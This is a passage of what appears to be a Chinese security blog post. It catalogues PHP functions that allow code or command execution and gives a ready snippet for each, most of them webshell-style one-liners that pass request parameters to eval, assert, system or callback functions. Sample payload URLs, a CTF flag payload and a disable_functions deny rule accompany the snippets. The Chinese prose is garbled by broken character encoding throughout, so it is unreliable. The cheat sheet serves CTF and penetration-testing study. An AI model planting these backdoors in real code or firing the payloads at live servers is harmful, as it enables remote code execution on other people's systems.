class="params">()</span></span></span><br><span class="line"></span><br><span class="line">å¯å˜å‡½æ•°$_GET<span class="selector-attr">[<span class="string">&#x27;a&#x27;</span>]</span>($_GET<span class="selector-attr">[<span class="string">&#x27;b&#x27;</span>]</span>)</span><br></pre></td></tr></table></figure><h2 id="2-å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š"><a href="#2-å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š" class="headerlink" title="2.å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š"></a>2.å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š</h2><p>system()ã€passthru()ã€exec()ã€shell_exec()ã€ pcntl_exec()ã€popen()ã€proc_open()</p><h2 id="3-å¸¸è§phpå¯ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼š"><a href="#3-å¸¸è§phpå¯ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼š" class="headerlink" title="3.å¸¸è§phpå¯ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼š"></a>3.å¸¸è§phpå¯ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼š</h2><p>eval()ã€assert()ã€preg_replace()ã€$</p><h2 id="4-ç¦ç”¨å±é™©å‡½æ•°ï¼š"><a href="#4-ç¦ç”¨å±é™©å‡½æ•°ï¼š" class="headerlink" title="4.ç¦ç”¨å±é™©å‡½æ•°ï¼š"></a>4.ç¦ç”¨å±é™©å‡½æ•°ï¼š</h2><p>phpé…ç½®æ–‡ä»¶php.inié‡Œæœ‰ä¸ªdisable_functions &#x3D; é…ç½®é€‰é¡¹ï¼Œå¯è‡ªå®šä¹‰ç¦ç”¨æŸäº›phpå±é™©å‡½æ•°.å¦‚:disable_functions &#x3D;system,passthru,shell_exec,exec,popen</p><h2 id="ä¸€ã€å¯æ‰§è¡Œphpä»£ç çš„å‡½æ•°"><a href="#ä¸€ã€å¯æ‰§è¡Œphpä»£ç çš„å‡½æ•°" class="headerlink" title="ä¸€ã€å¯æ‰§è¡Œphpä»£ç çš„å‡½æ•°"></a>ä¸€ã€å¯æ‰§è¡Œphpä»£ç çš„å‡½æ•°</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="title function_ invoke__">assert</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>php 7.1.7 ï¼Œå·²ç»æ— æ³•ç”¨call_user_funcå›è°ƒè°ƒç”¨ test.php?cmd&#x3D;phpinfo(); preg_replace()  5.6ä»¥ä¸‹å¯ä»¥æ‰§è¡Œ 5.6ä»¥ä¸Šä»ç„¶å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯ä¼šæœ‰è­¦å‘Š PHP7åå·²ç»ä¸æ”¯æŒ&#x2F;eä¿®é¥°ç¬¦  preg_replace(â€œ&#x2F;test&#x2F;eâ€,$_GET[â€œhâ€],â€jutst testâ€); &#x2F;&#x2F;å°†jutst  testä»¥&#x2F;testæ­£åˆ™åŒ¹é…ä»¥hæ¥æ›¿æ¢ &#x2F;e ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç   ?h&#x3D;phpinfo() ${phpinfo()}</p><h2 id="äºŒã€å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤-x2F-ä»£ç æ‰§è¡Œå‡½æ•°ï¼š"><a href="#äºŒã€å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤-x2F-ä»£ç æ‰§è¡Œå‡½æ•°ï¼š" class="headerlink" title="äºŒã€å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤&#x2F;ä»£ç æ‰§è¡Œå‡½æ•°ï¼š"></a>äºŒã€å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤&#x2F;ä»£ç æ‰§è¡Œå‡½æ•°ï¼š</h2><h3 id="1-call-user-func"><a href="#1-call-user-func" class="headerlink" title="1) call_user_func()"></a>1) call_user_func()</h3><p><code>call_user_func</code> â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨, å…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°</p><h4 id="å›è°ƒå‡½æ•°"><a href="#å›è°ƒå‡½æ•°" class="headerlink" title="å›è°ƒå‡½æ•°"></a>å›è°ƒå‡½æ•°</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a1&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;a2&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a1=system&amp;a2=whoami  //å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">//xxx.php?a1=assert&amp;a2=phpinfo()   //ä»£ç æ‰§è¡Œ </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="è°ƒç”¨ç±»ä¸­çš„å‡½æ•°"><a href="#è°ƒç”¨ç±»ä¸­çš„å‡½æ•°" class="headerlink" title="è°ƒç”¨ç±»ä¸­çš„å‡½æ•°"></a>è°ƒç”¨ç±»ä¸­çš„å‡½æ•°</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">phpä¸­ -&gt;ä¸::</span> è°ƒç”¨ç±»ä¸­çš„æˆå‘˜çš„åŒºåˆ«</span><br><span class="line"></span><br><span class="line"> -&gt;ç”¨äºåŠ¨æ€è¯­å¢ƒå¤„ç†æŸä¸ªç±»çš„æŸä¸ªå®ä¾‹</span><br><span class="line"> </span><br><span class="line"><span class="title"> ::</span>å¯ä»¥è°ƒç”¨ä¸€ä¸ªé™æ€çš„ã€ä¸ä¾èµ–äºå…¶ä»–åˆå§‹åŒ–çš„ç±»æ–¹æ³•.</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œ<code>payload</code>ä¸º</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ctfshow</span>=ctfshow::getFlag</span><br></pre></td></tr></table></figure><h4 id="è°ƒç”¨ç±»ä¸­çš„å‡½æ•°ã€æ•°ç»„ã€‘"><a href="#è°ƒç”¨ç±»ä¸­çš„å‡½æ•°ã€æ•°ç»„ã€‘" class="headerlink" title="è°ƒç”¨ç±»ä¸­çš„å‡½æ•°ã€æ•°ç»„ã€‘"></a>è°ƒç”¨ç±»ä¸­çš„å‡½æ•°ã€æ•°ç»„ã€‘</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">call<span class="constructor">_user_func()</span>å‚æ•°ä¸ä»…å¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œè¿˜æœ‰ æ•°ç»„å½¢å¼ï¼</span><br><span class="line"></span><br><span class="line">call<span class="constructor">_user_func(<span class="params">array</span>($<span class="params">classname</span>, &#x27;<span class="params">say_hello</span>&#x27;)</span>);</span><br><span class="line">è°ƒç”¨classnameè¿™ä¸ªç±»é‡Œçš„sya_helloæ–¹æ³•</span><br><span class="line"></span><br><span class="line"><span class="built_in">array</span><span class="literal">[<span class="number">0</span>]</span>=$classname  ç±»å</span><br><span class="line"><span class="built_in">array</span><span class="literal">[<span class="number">1</span>]</span>=say_hello   say<span class="constructor">_hello()</span>æ–¹æ³•</span><br></pre></td></tr></table></figure><pre><code>æŒ‰ç…§ä¸Šè¿°æ ¼å¼å¾—åˆ°payloadï¼šctfshow[]=ctfshow&amp;ctfshow[]=getFlag   #POST</code></pre><h3 id="2-call-user-func-array"><a href="#2-call-user-func-array" class="headerlink" title="2)call_user_func_array()"></a>2)call_user_func_array()</h3><p>call_user_func_array()æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼ˆcallbackï¼‰è°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„ä½œï¼ˆparam_arrï¼‰ä¸ºå›è°ƒå‡½æ•°çš„çš„å‚æ•°ä¼ å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a1&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;a2&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a1=system&amp;a2[]=whoami</span></span><br><span class="line"><span class="comment">//xxx.php?a1=assert&amp;a2[]=phpinfo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-create-function"><a href="#3-create-function" class="headerlink" title="3)create_function()"></a>3)create_function()</h3><p>åˆ›å»ºåŒ¿åå‡½æ•°ï¼ˆAnonymous functionsï¼‰ï¼Œå…è®¸ ä¸´æ—¶åˆ›å»ºä¸€ä¸ªæ²¡æœ‰æŒ‡å®šåç§°çš„å‡½æ•°ã€‚æœ€ç»å¸¸ç”¨ä½œå›è°ƒå‡½æ•°ï¼ˆcallbackï¼‰å‚æ•°çš„å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="variable">$b</span>();</span><br><span class="line"><span class="comment">//xxx.php?a=phpinfo();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-array-walk"><a href="#4-array-walk" class="headerlink" title="4) array_walk()"></a>4) array_walk()</h3><p>array_walk â€” ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ åšå›è°ƒå¤„ç†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a[]=phpinfo()&amp;b=assert</span></span><br><span class="line"><span class="comment">//xxx.php?a[]=whoami&amp;b=system</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-array-map"><a href="#5-array-map" class="headerlink" title="5)array_map()"></a>5)array_map()</h3><p>array_map()ä¸ºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ åº”ç”¨å›è°ƒå‡½æ•°ã€‚è¿”å›æ•°ç»„ï¼Œæ˜¯ä¸º array1 æ¯ä¸ªå…ƒç´ åº”ç”¨ callbackå‡½æ•°ä¹‹åçš„æ•°ç»„ã€‚callback å‡½æ•°å½¢å‚çš„æ•°é‡å’Œä¼ ç»™ array_map() æ•°ç»„æ•°é‡ï¼Œä¸¤è€…å¿…é¡»ä¸€æ ·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a=system&amp;b[]=whoami</span></span><br><span class="line"><span class="comment">//xxx.php?a=assert&amp;b[]=phpinfo()</span></span><br><span class="line"><span class="comment">//$array = array(0,1,2,3,4,5);</span></span><br><span class="line"><span class="comment">//array_map($_GET[&#x27;a&#x27;],$array);</span></span><br><span class="line"><span class="comment">//.php?a=phpinfo </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="6-array-filter"><a href="#6-array-filter" class="headerlink" title="6) array_filter()"></a>6) array_filter()</h3><p>array_filter()ç”¨å›è°ƒå‡½æ•°è¿‡æ»¤æ•°ç»„ä¸­çš„å•å…ƒã€‚ä¾æ¬¡å°† array æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’åˆ° callback å‡½æ•°ã€‚å¦‚æœ callback å‡½æ•°è¿”å› trueï¼Œ åˆ™ array æ•°ç»„çš„å½“å‰å€¼ä¼šè¢«åŒ…å«åœ¨è¿”å›çš„ç»“æœæ•°ç»„ä¸­ã€‚æ•°ç»„çš„é”®åä¿ç•™ä¸å˜ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]),<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br><span class="line"><span class="comment">//?func=assert&amp;cmd=phpinfo() </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="7-å¯å˜å‡½æ•°-var-args"><a href="#7-å¯å˜å‡½æ•°-var-args" class="headerlink" title="7) å¯å˜å‡½æ•°$var(args)"></a>7) å¯å˜å‡½æ•°$var(args)</h3><p>PHP æ”¯æŒå¯å˜å‡½æ•°çš„æ¦‚å¿µã€‚å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHP å°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œ å¹¶ä¸”å°è¯•æ‰§è¡Œå®ƒã€‚å¯å˜å‡½æ•°å¯ä»¥ç”¨æ¥å®ç°åŒ…æ‹¬å›è°ƒå‡½æ•°ï¼Œå‡½æ•°è¡¨åœ¨å†…çš„ä¸€äº›ç”¨é€”ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a=system&amp;b=whoami</span></span><br><span class="line"><span class="comment">//xxx?a=assert&amp;b=phpinfo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-usort"><a href="#8-usort" class="headerlink" title="8) usort()"></a>8) usort()</h3><p>æœ¬å‡½æ•°å°†ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹ä¸€ä¸ªæ•°ç»„ä¸­çš„å€¼è¿›è¡Œæ’åº php5.6ä¹‹å‰å¯ä»¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">payload: <span class="number">1</span>.php?<span class="number">1</span>[<span class="number">0</span>]=<span class="number">0</span>&amp;<span class="number">1</span>[<span class="number">1</span>]=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])&amp;<span class="number">2</span>=assert POSTä¼ å‚: x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><h3 id="9ï¼‰uasort"><a href="#9ï¼‰uasort" class="headerlink" title="9ï¼‰uasort"></a>9ï¼‰uasort</h3><p>php5.6 php7ä¸å¯ä»¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$onearray</span> = <span class="keyword">array</span>(<span class="string">&#x27;Ameng&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">uasort</span>(<span class="variable">$onearray</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">payload: <span class="number">1</span>.php?a=assert POSTä¼ å‚: x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><h3 id="10ï¼‰ob-start"><a href="#10ï¼‰ob-start" class="headerlink" title="10ï¼‰ob_start"></a>10ï¼‰ob_start</h3><p>ob_start â€” æ‰“å¼€è¾“å‡ºæ§åˆ¶ç¼“å†²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$foobar</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="variable">$foobar</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">/test.php?h=whoami&amp;b=system</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š"><a href="#ä¸‰ã€å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š" class="headerlink" title="ä¸‰ã€å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š"></a>ä¸‰ã€å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š</h2><h3 id="1-system"><a href="#1-system" class="headerlink" title="1) system()"></a>1) system()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">//xxx.php?a=whoami ?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-passthru"><a href="#2-passthru" class="headerlink" title="2) passthru()"></a>2) passthru()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">//xxx.php?a=whoami ?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-exec"><a href="#3-exec" class="headerlink" title="3) exec()"></a>3) exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//xxx.php?a=whoami </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-shell-exec"><a href="#4-shell-exec" class="headerlink" title="4) shell_exec()"></a>4) shell_exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//xxx.php?a=whoami </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-pcntl-exec"><a href="#5-pcntl-exec" class="headerlink" title="5) pcntl_exec()"></a>5) pcntl_exec()</h3><p>è¦æ±‚ï¼šlinuxç³»ç»Ÿç‰¹æœ‰æ¨¡å—ï¼Œéœ€ç¼–è¯‘é€‰é¡¹ä¸­å­˜åœ¨â€”enable-pcntl</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>( <span class="string">&quot;/bin/bash&quot;</span> , <span class="keyword">array</span>(<span class="string">&quot;whoami&quot;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="6-popen"><a href="#6-popen" class="headerlink" title="6) popen()"></a>6) popen()</h3><p>popen â€” æ‰“å¼€è¿›ç¨‹æ–‡ä»¶æŒ‡é’ˆã€‚æ‰“å¼€ä¸€ä¸ªæŒ‡å‘è¿›ç¨‹çš„ç®¡é“ï¼Œè¯¥è¿›ç¨‹ç”±æ´¾ç”Ÿç»™å®šçš„ command å‘½ä»¤æ‰§è¡Œè€Œäº§ç”Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">popen â€” æ‰“å¼€è¿›ç¨‹æ–‡ä»¶æŒ‡é’ˆã€‚æ‰“å¼€ä¸€ä¸ªæŒ‡å‘è¿›ç¨‹çš„ç®¡é“ï¼Œè¯¥è¿›ç¨‹ç”±æ´¾ç”Ÿç»™å®šçš„ command å‘½ä»¤æ‰§è¡Œè€Œäº§ç”Ÿ</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$test</span>,<span class="string">&quot;r&quot;</span>);  <span class="comment">//popenæ‰“ä¸€ä¸ªè¿›ç¨‹é€šé“</span></span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;      <span class="comment">//ä»é€šé“å–å‡ºå†…å®¹</span></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">4096</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="7-proc-open"><a href="#7-proc-open" class="headerlink" title="7) proc_open()"></a>7) proc_open()</h3><p>ç±»ä¼¼ popen() å‡½æ•°ï¼Œ ä½†æ˜¯ proc_open() æä¾›äº†æ›´åŠ å¼ºå¤§çš„æ§åˆ¶ç¨‹åºæ‰§è¡Œçš„èƒ½åŠ›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ç±»ä¼¼ <span class="title function_ invoke__">popen</span>() å‡½æ•°ï¼Œ ä½†æ˜¯ <span class="title function_ invoke__">proc_open</span>() æä¾›äº†æ›´åŠ å¼ºå¤§çš„æ§åˆ¶ç¨‹åºæ‰§è¡Œçš„èƒ½åŠ›</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å…¥</span></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å‡ºå†…å®¹</span></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//æ ‡å‡†è¾“å‡ºé”™è¯¯</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹é€šé“</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//ä¸ºä»€ä¹ˆæ˜¯$pipes[1]ï¼Œå› 